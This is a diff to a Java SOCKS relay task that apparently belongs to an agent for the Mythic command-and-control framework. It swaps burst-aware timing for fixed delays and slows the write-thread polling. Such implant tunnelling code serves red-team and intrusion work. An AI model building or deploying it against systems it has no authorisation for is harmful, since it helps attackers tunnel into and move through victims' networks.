@@ -293,7 +293,6 @@ public class SocksBackgroundTask implements Runnable {
                 int packetCount = 0;
                 int sleepCounter = 0;
                 final int SLEEP_THRESHOLD = 10;
-                long lastReadTime = System.currentTimeMillis();
                 
                 while (conn.running && !conn.targetSocket.isClosed()) {
                     try {
@@ -308,20 +307,16 @@ public class SocksBackgroundTask implements Runnable {
                             
                             // Adaptive delay based on traffic pattern
                             // If we're in a burst (packets arriving quickly), minimize delay
-                            long now = System.currentTimeMillis();
-                            long timeSinceLastRead = now - lastReadTime;
-                            lastReadTime = now;
-                            
-                            if (timeSinceLastRead < 50) {
-                                // Fast burst traffic (RDP graphics/interaction) - no delay
-                                // Let the socket timeout provide rate limiting
-                            } else if (packetCount < 50) {
-                                // Initial handshake - moderate delay
-                                Thread.sleep(20);
+                            // Adaptive delay exactly matching oopsie
+                            long delayMs;
+                            if (packetCount < 50) {
+                                delayMs = 100; // Very slow for handshake and initial commands
+                            } else if (packetCount < 200) {
+                                delayMs = 75; // Still conservative for active usage
                             } else {
-                                // Normal traffic - minimal delay
-                                Thread.sleep(10);
+                                delayMs = 50; // Moderate speed for long-running stable sessions
                             }
+                            Thread.sleep(delayMs);
                         } else if (bytesRead < 0) {
                             // Connection closed by target
                             Config.debugLog(config, "[socks] Connection " + conn.serverId + " closed by target");
@@ -345,15 +340,13 @@ public class SocksBackgroundTask implements Runnable {
             }
         });
         
-        // Write thread - writes data from Mythic to target
-        // Critical for RDP: needs to be very responsive to user input
+        // Write thread - writes data from Mythic to target  
         Thread writeThread = new Thread(() -> {
             try {
                 OutputStream out = conn.targetSocket.getOutputStream();
                 
                 while (conn.running && !conn.targetSocket.isClosed()) {
-                    // Very short poll for responsiveness to user interactions
-                    byte[] toSend = conn.outgoingData.poll(1, java.util.concurrent.TimeUnit.MILLISECONDS);
+                    byte[] toSend = conn.outgoingData.poll(10, java.util.concurrent.TimeUnit.MILLISECONDS);
                     if (toSend != null) {
                         out.write(toSend);
                         out.flush();
